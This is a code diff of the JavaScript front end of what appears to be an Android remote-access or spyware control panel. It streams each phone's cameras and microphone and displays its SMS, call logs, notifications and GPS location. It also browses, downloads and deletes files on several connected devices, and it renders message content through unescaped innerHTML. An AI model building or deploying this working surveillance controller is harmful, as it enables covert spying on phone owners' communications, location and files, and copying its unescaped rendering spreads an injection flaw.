@@ -1,16 +1,10 @@
 // Dynamic IP detection based on environment
 function getServerURL() {
   const hostname = window.location.hostname;
-  const protocol = window.location.protocol; // http or https
-  const port = window.location.port;
-
-  // If accessing via localhost or internal IP, use localhost:3000
   if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
     return 'http://localhost:3000';
   }
-
-  // If we're on Render or another HTTPS host, use same protocol/hostname (no port needed)
-  return `${protocol}//${hostname}${port ? ':' + port : ''}`;
+  return `http://${hostname}:3000`;
 }
 
 const socket = io(getServerURL(), {
@@ -24,30 +18,29 @@ const socket = io(getServerURL(), {
 const videoFront = document.getElementById('remoteVideoFront');
 const videoBack = document.getElementById('remoteVideoBack');
 const statusDiv = document.getElementById('status');
-const notificationListDiv = document.getElementById('notificationList');
-const callLogListDiv = document.getElementById('callLogList');
-const smsListDiv = document.getElementById('smsList');
+const notificationsDiv = document.getElementById('notifications');
+const callLogsDiv = document.getElementById('callLogs');
+const smsDiv = document.getElementById('smsMessages');
 const debugLog = document.getElementById('debugLog');
 const retryButton = document.getElementById('retryButton');
-const clientSelect = document.getElementById('clientSelect');
+const clientSelector = document.getElementById('clientSelector');
 
-let peer;
-let myId;
-let androidClientId; // Currently selected client
-let connectedAndroidClients = []; // All connected clients
-let map;
-let marker;
+let peer = null;
+let myId = null;
+let selectedAndroidClientId = null;
+let connectedAndroidClients = [];
+let map = null;
+let marker = null;
 let audioTrack = null;
 let frontVideoTrack = null;
 let backVideoTrack = null;
 
-// Chunked Download State
-let activeDownloads = {}; // Map of fileId -> { name, buffer, totalChunks, receivedChunks }
+let activeDownloads = {};
 
 const config = {
   iceServers: [
     { urls: 'stun:stun.l.google.com:19302' },
-    { urls: 'turn:numb.viagenie.ca', username: 'test@email.com', credential: 'Test@4572' }
+    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
   ]
 };
 
@@ -58,74 +51,48 @@ function updateStatus(message) {
   retryButton.style.display = message.includes('Failed') ? 'block' : 'none';
 }
 
-// Update the client selector dropdown
-function updateClientList(clients) {
-  connectedAndroidClients = clients;
-  clientSelect.innerHTML = '';
-  
-  if (clients.length === 0) {
-    clientSelect.innerHTML = '<option value="">-- No clients connected --</option>';
-    androidClientId = null;
-    return;
-  }
-  
-  // Add an option for each client
-  clients.forEach(client => {
-    const option = document.createElement('option');
-    option.value = client.id;
-    option.textContent = `Client: ${client.ip} (${client.id.substring(0, 8)}...)`;
-    clientSelect.appendChild(option);
-  });
-  
-  // If there was a previously selected client, try to keep it selected
-  if (androidClientId && clients.some(c => c.id === androidClientId)) {
-    clientSelect.value = androidClientId;
-  } else {
-    // Select the first client by default
-    selectClient(clients[0].id);
-  }
-}
-
-// Handle client selection
-function selectClient(clientId) {
-  if (clientId === androidClientId) return;
-  
-  logDebug(`Selecting client: ${clientId}`);
-  
-  // Clear previous data
-  notificationListDiv.innerHTML = '';
-  callLogListDiv.innerHTML = '';
-  smsListDiv.innerHTML = '';
-  videoFront.srcObject = null;
-  videoBack.srcObject = null;
-  
-  // Close previous peer connection if any
-  if (peer) {
-    peer.close();
-    peer = null;
-    audioTrack = null;
-    frontVideoTrack = null;
-    backVideoTrack = null;
-  }
-  
-  // Update selected client
-  androidClientId = clientId;
-  clientSelect.value = clientId;
-  
-  // Request initial data from this client
-  requestFileList(currentPath);
-  
-  // Notify server we want to connect to this client (if needed)
-  socket.emit('select-client', clientId);
-  logDebug(`Client selected: ${clientId}`);
-}
-
 function logDebug(message) {
   const logEntry = document.createElement('div');
   logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
   debugLog.prepend(logEntry);
   while (debugLog.children.length > 50) {
     debugLog.removeChild(debugLog.lastChild);
+  }
+}
+
+function updateClientSelector() {
+  clientSelector.innerHTML = '';
+  if (connectedAndroidClients.length === 0) {
+    clientSelector.innerHTML = '<option value="">No devices connected</option>';
+    return;
+  }
+  connectedAndroidClients.forEach(client => {
+    const option = document.createElement('option');
+    option.value = client.id;
+    option.textContent = `Device ${client.id.substring(0, 8)} (${client.address})`;
+    if (client.id === selectedAndroidClientId) {
+      option.selected = true;
+    }
+    clientSelector.appendChild(option);
+  });
+}
+
+function clearCurrentClientData() {
+  notificationsDiv.innerHTML = '';
+  callLogsDiv.innerHTML = '';
+  smsDiv.innerHTML = '';
+  videoFront.srcObject = null;
+  videoBack.srcObject = null;
+  audioTrack = null;
+  frontVideoTrack = null;
+  backVideoTrack = null;
+  if (marker) {
+    marker.remove();
+    marker = null;
+  }
+  if (peer) {
+    peer.close();
+    peer = null;
   }
 }
 
@@ -138,9 +105,9 @@ function addNotification(notification) {
     <p><strong>Text:</strong> ${notification.text}</p>
     <p class="timestamp">${notification.timestamp}</p>
   `;
-  notificationListDiv.prepend(notificationEl);
-  while (notificationListDiv.children.length > 10) {
-    notificationListDiv.removeChild(notificationListDiv.lastChild);
+  notificationsDiv.prepend(notificationEl);
+  while (notificationsDiv.children.length > 10) {
+    notificationsDiv.removeChild(notificationsDiv.lastChild);
   }
   logDebug(`Received notification from ${notification.appName}`);
 }
@@ -154,9 +121,9 @@ function addCallLog(call) {
     <p><strong>Date:</strong> ${call.date}</p>
     <p><strong>Duration:</strong> ${call.duration} seconds</p>
   `;
-  callLogListDiv.prepend(callLogEl);
-  while (callLogListDiv.children.length > 10) {
-    callLogListDiv.removeChild(callLogListDiv.lastChild);
+  callLogsDiv.prepend(callLogEl);
+  while (callLogsDiv.children.length > 10) {
+    callLogsDiv.removeChild(callLogsDiv.lastChild);
   }
   logDebug(`Received call log: ${call.number}`);
 }
@@ -170,9 +137,9 @@ function addSmsMessage(sms) {
     <p><strong>Date:</strong> ${sms.date}</p>
     <p><strong>Body:</strong> ${sms.body}</p>
   `;
-  smsListDiv.prepend(smsEl);
-  while (smsListDiv.children.length > 50) {
-    smsListDiv.removeChild(smsListDiv.lastChild);
+  smsDiv.prepend(smsEl);
+  while (smsDiv.children.length > 50) {
+    smsDiv.removeChild(smsDiv.lastChild);
   }
   logDebug(`Received SMS from ${sms.address}`);
 }
@@ -231,6 +198,17 @@ function reconnectSocket() {
   socket.connect();
 }
 
+clientSelector.addEventListener('change', (e) => {
+  const newClientId = e.target.value;
+  if (newClientId === selectedAndroidClientId) return;
+  selectedAndroidClientId = newClientId;
+  clearCurrentClientData();
+  if (newClientId) {
+    logDebug(`Selected device: ${newClientId}`);
+    socket.emit('web-client-ready', myId);
+  }
+});
+
 socket.on('connect', () => {
   updateStatus('Connected to signaling server');
 });
@@ -245,57 +223,80 @@ socket.on('id', id => {
   myId = id;
   logDebug(`Received socket ID: ${myId}`);
   socket.emit('identify', 'web');
+  socket.emit('web-client-ready', myId);
   updateStatus('Announced readiness to receive stream');
 });
 
-// Listen for list of connected Android clients
-socket.on('android-clients-list', clients => {
-  logDebug(`Received clients list: ${clients.length} clients`);
-  updateClientList(clients);
-});
-
-socket.on('android-client-ready', id => {
-  logDebug(`Android client ready: ${id}`);
-});
-
-socket.on('notification', data => {
-  logDebug(`Received notification from ${data.from}`);
-  if (data.from === androidClientId && data.notification) {
-    addNotification(data.notification);
+socket.on('android-clients-list', (clients) => {
+  logDebug(`Received ${clients.length} connected devices`);
+  connectedAndroidClients = clients;
+  updateClientSelector();
+  if (connectedAndroidClients.length > 0 && !selectedAndroidClientId) {
+    selectedAndroidClientId = connectedAndroidClients[0].id;
+    updateClientSelector();
+    logDebug(`Auto-selected device: ${selectedAndroidClientId}`);
   }
 });
 
-socket.on('call_log', data => {
-  logDebug(`Received call log from ${data.from}`);
-  if (data.from === androidClientId && data.call_logs) {
-    data.call_logs.forEach(call => addCallLog(call));
+socket.on('android-client-connected', (clientInfo) => {
+  logDebug(`New device connected: ${clientInfo.id} (${clientInfo.address})`);
+  connectedAndroidClients.push(clientInfo);
+  updateClientSelector();
+  if (!selectedAndroidClientId) {
+    selectedAndroidClientId = clientInfo.id;
+    updateClientSelector();
+  }
+});
+
+socket.on('android-client-disconnected', (id) => {
+  logDebug(`Device disconnected: ${id}`);
+  connectedAndroidClients = connectedAndroidClients.filter(c => c.id !== id);
+  updateClientSelector();
+  if (id === selectedAndroidClientId) {
+    selectedAndroidClientId = connectedAndroidClients.length > 0 ? connectedAndroidClients[0].id : null;
+    clearCurrentClientData();
+    updateClientSelector();
+  }
+});
+
+socket.on('notification', data => {
+  if (data.from === selectedAndroidClientId) {
+    logDebug(`Received notification from ${data.from}`);
+    if (data.notification) {
+      addNotification(data.notification);
+    }
+  }
+});
+
+socket.on('call-log', data => {
+  if (data.from === selectedAndroidClientId) {
+    logDebug(`Received call log from ${data.from}`);
+    if (data.call_logs) {
+      data.call_logs.forEach(call => addCallLog(call));
+    }
   }
 });
 
 socket.on('sms', data => {
-  logDebug(`Received SMS messages from ${data.from}`);
-  if (data.from === androidClientId && data.sms_messages) {
-    data.sms_messages.forEach(sms => addSmsMessage(sms));
+  if (data.from === selectedAndroidClientId) {
+    logDebug(`Received SMS messages from ${data.from}`);
+    if (data.sms_messages) {
+      data.sms_messages.forEach(sms => addSmsMessage(sms));
+    }
   }
 });
 
 socket.on('location', data => {
-  logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
-  if (data.from === androidClientId) {
+  if (data.from === selectedAndroidClientId) {
+    logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
     updateMap(data.latitude, data.longitude);
   }
 });
 
 socket.on('signal', async (data) => {
+  if (data.from !== selectedAndroidClientId) return;
   logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
   const { from, signal } = data;
-
-  // Only process signals from the currently selected client
-  if (from !== androidClientId) {
-    logDebug(`Ignoring signal from unselected client: ${from}`);
-    return;
-  }
-
   if (!peer) {
     logDebug('Creating new peer connection');
     try {
@@ -303,7 +304,6 @@ socket.on('signal', async (data) => {
       peer.addTransceiver('video', { direction: 'recvonly' });
       peer.addTransceiver('video', { direction: 'recvonly' });
       peer.addTransceiver('audio', { direction: 'recvonly' });
-
       peer.ontrack = (event) => {
         const track = event.track;
         if (track.kind === 'audio') {
@@ -315,7 +315,6 @@ socket.on('signal', async (data) => {
         }
         updateStreams();
       };
-
       peer.onicecandidate = e => {
         if (e.candidate) {
           logDebug(`Sending ICE candidate: ${e.candidate.sdpMid}`);
@@ -326,7 +325,6 @@ socket.on('signal', async (data) => {
           });
         }
       };
-
       peer.oniceconnectionstatechange = () => {
         logDebug(`ICE connection state: ${peer.iceConnectionState}`);
         updateStatus(`ICE connection: ${peer.iceConnectionState}`);
@@ -334,7 +332,6 @@ socket.on('signal', async (data) => {
           updateStatus('Connection failed, please refresh or retry');
         }
       };
-
       peer.onsignalingstatechange = () => {
         logDebug(`Signaling state: ${peer.signalingState}`);
       };
@@ -343,7 +340,6 @@ socket.on('signal', async (data) => {
       updateStatus(`Peer connection error: ${err.message}`);
     }
   }
-
   try {
     if (signal.type === 'offer') {
       logDebug(`Processing offer from Android, SDP: ${signal.sdp.substring(0, 50)}...`);
@@ -367,25 +363,6 @@ socket.on('signal', async (data) => {
   }
 });
 
-socket.on('android-client-disconnected', () => {
-  updateStatus('Android client disconnected');
-  if (peer) {
-    peer.close();
-    peer = null;
-    videoFront.srcObject = null;
-    videoBack.srcObject = null;
-    document.body.style.backgroundColor = '#111827';
-  }
-  notificationListDiv.innerHTML = '';
-  callLogListDiv.innerHTML = '';
-  smsListDiv.innerHTML = '';
-  if (marker) {
-    marker.remove();
-    marker = null;
-  }
-  logDebug('Android client disconnected');
-});
-
 socket.on('error', (error) => {
   console.error('Socket.IO server error:', error);
   updateStatus(`Server error: ${error.message}`);
@@ -401,17 +378,12 @@ const fileListDiv = document.getElementById('fileList');
 let currentPath = "/storage/emulated/0/";
 
 function requestFileList(path) {
-  logDebug(`[FS] Requesting files for path: ${path}`);
-  if (!androidClientId) {
-    updateStatus('No Android client connected');
-    logDebug('[FS] Error: No Android client ID (androidClientId is null)');
+  if (!selectedAndroidClientId) {
+    updateStatus('No Android client selected');
     return;
   }
   updateStatus(`Requesting files for: ${path}`);
-  
-  // Explicitly logging the emit
-  console.log(`[FS] Emitting fs:list for path: ${path} to ${androidClientId}`);
-  socket.emit('fs:list', { to: androidClientId, path: path }); // Send as Object to ensure correct routing
+  socket.emit('fs:list', { to: selectedAndroidClientId, path: path });
 }
 
 function renderFileList(files, path) {
@@ -420,250 +392,170 @@ function renderFileList(files, path) {
     fsPathInput.value = path;
   }
   fileListDiv.innerHTML = '';
-  
   if (!files || files.length === 0) {
-    fileListDiv.innerHTML = '<div style="color: #9ca3af; padding: 10px;">This directory is empty.</div>';
+    fileListDiv.innerHTML = '<div style="color: #9ca3af; padding: 10px; text-align: center; margin-top: 20px;">This directory is empty.</div>';
     return;
   }
-
-  // Sort: Directories first, then files
   files.sort((a, b) => {
     if (a.isDir && !b.isDir) return -1;
     if (!a.isDir && b.isDir) return 1;
     return a.name.localeCompare(b.name);
   });
-
   files.forEach(file => {
     const item = document.createElement('div');
     item.style.cssText = 'display: flex; align-items: center; padding: 8px; border-bottom: 1px solid #1f2937; cursor: pointer; transition: background 0.2s;';
     item.onmouseover = () => item.style.background = '#1f2937';
     item.onmouseout = () => item.style.background = 'transparent';
-
     const icon = document.createElement('span');
     icon.textContent = file.isDir ? '📁' : '📄';
     icon.style.marginRight = '10px';
     icon.style.fontSize = '1.2rem';
-
     const info = document.createElement('div');
     info.style.flex = '1';
-    
     const name = document.createElement('div');
     name.textContent = file.name;
     name.style.color = file.isDir ? '#34d399' : '#d1d5db';
     name.style.fontWeight = file.isDir ? 'bold' : 'normal';
-
     const size = document.createElement('div');
     size.textContent = file.isDir ? 'Dir' : formatBytes(file.size);
     size.style.fontSize = '0.8rem';
     size.style.color = '#6b7280';
-
     info.appendChild(name);
     info.appendChild(size);
-
     const actions = document.createElement('div');
-    
     if (!file.isDir) {
-        const downloadBtn = document.createElement('button');
-        downloadBtn.textContent = '⬇';
-        downloadBtn.title = 'Download';
-        downloadBtn.style.cssText = 'background: none; border: none; cursor: pointer; margin-right: 8px; font-size: 1.1rem;';
-        downloadBtn.onclick = (e) => {
-            e.stopPropagation();
-            requestFileDownload(file.path);
-        };
-        actions.appendChild(downloadBtn);
+      const downloadBtn = document.createElement('button');
+      downloadBtn.textContent = '⬇';
+      downloadBtn.title = 'Download';
+      downloadBtn.style.cssText = 'background: none; border: none; cursor: pointer; margin-right: 8px; font-size: 1.1rem;';
+      downloadBtn.onclick = (e) => {
+        e.stopPropagation();
+        requestFileDownload(file.path);
+      };
+      actions.appendChild(downloadBtn);
     }
-    
     const deleteBtn = document.createElement('button');
     deleteBtn.textContent = '🗑';
     deleteBtn.title = 'Delete';
     deleteBtn.style.cssText = 'background: none; border: none; cursor: pointer; font-size: 1.1rem;';
     deleteBtn.onclick = (e) => {
-        e.stopPropagation();
-        if(confirm(`Delete ${file.name}?`)) {
-            deleteFile(file.path);
-        }
+      e.stopPropagation();
+      if (confirm(`Delete ${file.name}?`)) {
+        deleteFile(file.path);
+      }
     };
     actions.appendChild(deleteBtn);
-
     item.appendChild(icon);
     item.appendChild(info);
     item.appendChild(actions);
-
     if (file.isDir) {
-        item.onclick = () => {
-            requestFileList(file.path);
-        };
+      item.onclick = () => requestFileList(file.path);
     }
-
     fileListDiv.appendChild(item);
   });
 }
 
 function formatBytes(bytes, decimals = 2) {
-    if (bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const dm = decimals < 0 ? 0 : decimals;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+  if (bytes === 0) return '0 Bytes';
+  const k = 1024;
+  const dm = decimals < 0 ? 0 : decimals;
+  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }
 
 function requestFileDownload(path) {
-    updateStatus(`Requesting download: ${path}`);
-    if (androidClientId) {
-        socket.emit('fs:download', { to: androidClientId, path: path });
-    }
+  if (!selectedAndroidClientId) return;
+  updateStatus(`Requesting download: ${path}`);
+  socket.emit('fs:download', { to: selectedAndroidClientId, path: path });
 }
 
 function deleteFile(path) {
-    updateStatus(`Deleting: ${path}`);
-    if (androidClientId) {
-        socket.emit('fs:delete', { to: androidClientId, path: path });
-        // Optimistically remove or refresh? Refresh is safer.
-        setTimeout(() => {
-             requestFileList(currentPath);
-        }, 1000);
-    }
+  if (!selectedAndroidClientId) return;
+  updateStatus(`Deleting: ${path}`);
+  socket.emit('fs:delete', { to: selectedAndroidClientId, path: path });
+  setTimeout(() => requestFileList(currentPath), 1000);
 }
 
-fsGoBtn.addEventListener('click', () => {
-    logDebug('[FS] Go button clicked');
-    requestFileList(fsPathInput.value);
-});
-
+fsGoBtn.addEventListener('click', () => requestFileList(fsPathInput.value));
 fsBackBtn.addEventListener('click', () => {
-    logDebug('[FS] Back button clicked');
-    // Basic parent directory logic
-    let path = currentPath;
-    if (path.endsWith('/')) path = path.slice(0, -1); // Remove trailing slash if exists (except root)
-    if (path === '') path = '/'; // Handle root case
-    
-    const lastSlash = path.lastIndexOf('/');
-    if (lastSlash !== -1) {
-        // substring(0, lastSlash + 1) keeps the trailing slash of the parent 
-        // e.g. /sdcard/foo -> /sdcard/
-        const parent = path.substring(0, lastSlash + 1) || '/'; 
-        logDebug(`[FS] Navigating up to: ${parent}`);
-        requestFileList(parent);
-    } else {
-        logDebug('[FS] Already at root or invalid path');
-        requestFileList('/');
-    }
+  let path = currentPath;
+  if (path.endsWith('/')) path = path.slice(0, -1);
+  if (path === '') path = '/';
+  const lastSlash = path.lastIndexOf('/');
+  if (lastSlash !== -1) {
+    const parent = path.substring(0, lastSlash + 1) || '/';
+    requestFileList(parent);
+  }
 });
 
-
-// Socket Handlers for FS
 socket.on('fs:files', (data) => {
-  logDebug('Received file list from ' + data.from);
-  if (data.from === androidClientId && data.file_list) {
-    renderFileList(data.file_list.files, data.file_list.currentPath);
+  if (data.to === myId || !data.to) {
+    logDebug('Received file list');
+    if (data.file_list) {
+      renderFileList(data.file_list.files, data.file_list.currentPath);
+    }
   }
 });
 
 socket.on('fs:download_start', (data) => {
-  logDebug(`[FS] Download start: ${data.name} from ${data.from}`);
-  if (data.from === androidClientId) {
-    const { fileId, name, size, totalChunks } = data;
-    activeDownloads[fileId] = {
-      name: name,
-      buffer: new Array(totalChunks),
-      totalChunks: totalChunks,
-      receivedChunks: 0,
-      startTime: Date.now()
-    };
-    updateStatus(`Downloading ${name} (0%)`);
-  }
+  const { fileId, name, size, totalChunks } = data;
+  logDebug(`[FS] Download start: ${name} (${totalChunks} chunks)`);
+  activeDownloads[fileId] = {
+    name: name,
+    buffer: new Array(totalChunks),
+    totalChunks: totalChunks,
+    receivedChunks: 0,
+    startTime: Date.now()
+  };
+  updateStatus(`Downloading ${name} (0%)`);
 });
 
 socket.on('fs:download_chunk', (data) => {
-  logDebug(`[FS] Download chunk from ${data.from}`);
-  if (data.from === androidClientId) {
-    const { fileId, chunkIndex, content } = data;
-    const download = activeDownloads[fileId];
-    
-    if (download) {
-      if (!download.buffer[chunkIndex]) {
-           download.buffer[chunkIndex] = content;
-           download.receivedChunks++;
-      }
-      
-      // Update progress every 5% or so to avoid UI spam
-      const progress = Math.floor((download.receivedChunks / download.totalChunks) * 100);
-      if (progress % 5 === 0) {
-        updateStatus(`Downloading ${download.name} (${progress}%)`);
-      }
+  const { fileId, chunkIndex, content } = data;
+  const download = activeDownloads[fileId];
+  if (download) {
+    if (!download.buffer[chunkIndex]) {
+      download.buffer[chunkIndex] = content;
+      download.receivedChunks++;
+    }
+    const progress = Math.floor((download.receivedChunks / download.totalChunks) * 100);
+    if (progress % 5 === 0) {
+      updateStatus(`Downloading ${download.name} (${progress}%)`);
     }
   }
 });
 
 socket.on('fs:download_complete', (data) => {
-  logDebug(`[FS] Download complete from ${data.from}`);
-  if (data.from === androidClientId) {
-    const { fileId } = data;
-    const download = activeDownloads[fileId];
-    
-    if (download) {
-      logDebug(`[FS] Download complete: ${download.name}`);
-      updateStatus(`Processing ${download.name}...`);
-      
-      // Verify we have all chunks
-      if (download.receivedChunks !== download.totalChunks) {
-        logDebug(`[FS] Warning: Missing chunks for ${download.name}. Received ${download.receivedChunks}/${download.totalChunks}`);
-      }
-
-      // Reassemble
-      const base64Complete = download.buffer.join('');
-      downloadBase64File(base64Complete, download.name);
-      
-      const duration = (Date.now() - download.startTime) / 1000;
-      updateStatus(`Downloaded ${download.name} in ${duration}s`);
-      
-      // Cleanup
-      delete activeDownloads[fileId];
-    }
+  const { fileId } = data;
+  const download = activeDownloads[fileId];
+  if (download) {
+    logDebug(`[FS] Download complete: ${download.name}`);
+    updateStatus(`Processing ${download.name}...`);
+    const base64Complete = download.buffer.join('');
+    downloadBase64File(base64Complete, download.name);
+    const duration = (Date.now() - download.startTime) / 1000;
+    updateStatus(`Downloaded ${download.name} in ${duration}s`);
+    delete activeDownloads[fileId];
   }
 });
 
 socket.on('fs:download_error', (data) => {
-  logDebug(`[FS] Download error from ${data.from}`);
-  if (data.from === androidClientId) {
-    const { fileId, error } = data;
-    if (activeDownloads[fileId]) {
-      const name = activeDownloads[fileId].name;
-      updateStatus(`Download failed: ${name}`);
-      logDebug(`[FS] Download error for ${name}: ${error}`);
-      delete activeDownloads[fileId];
-    } else {
-       logDebug(`[FS] Download error: ${error}`);
-    }
+  const { fileId, error } = data;
+  if (activeDownloads[fileId]) {
+    const name = activeDownloads[fileId].name;
+    updateStatus(`Download failed: ${name}`);
+    logDebug(`[FS] Download error for ${name}: ${error}`);
+    delete activeDownloads[fileId];
   }
-});
-
-// Handle client select change
-clientSelect.addEventListener('change', (e) => {
-  const selectedId = e.target.value;
-  if (selectedId) {
-    selectClient(selectedId);
-  }
-});
-
-// Deprecated single-blob handler (kept for potential fallback if needed, but likely unused manually)
-socket.on('fs:download_ready', (data) => {
-    logDebug('Received legacy file download data');
-    if (data.file_data) {
-        const { name, content } = data.file_data; 
-        downloadBase64File(content, name);
-        updateStatus(`Download ready: ${name}`);
-    }
 });
 
 function downloadBase64File(base64Data, fileName) {
-    const linkSource = `data:application/octet-stream;base64,${base64Data}`;
-    const downloadLink = document.createElement("a");
-    downloadLink.href = linkSource;
-    downloadLink.download = fileName;
-    downloadLink.click();
+  const linkSource = `data:application/octet-stream;base64,${base64Data}`;
+  const downloadLink = document.createElement("a");
+  downloadLink.href = linkSource;
+  downloadLink.download = fileName;
+  downloadLink.click();
 }
 
 updateStatus('Connecting to server...');
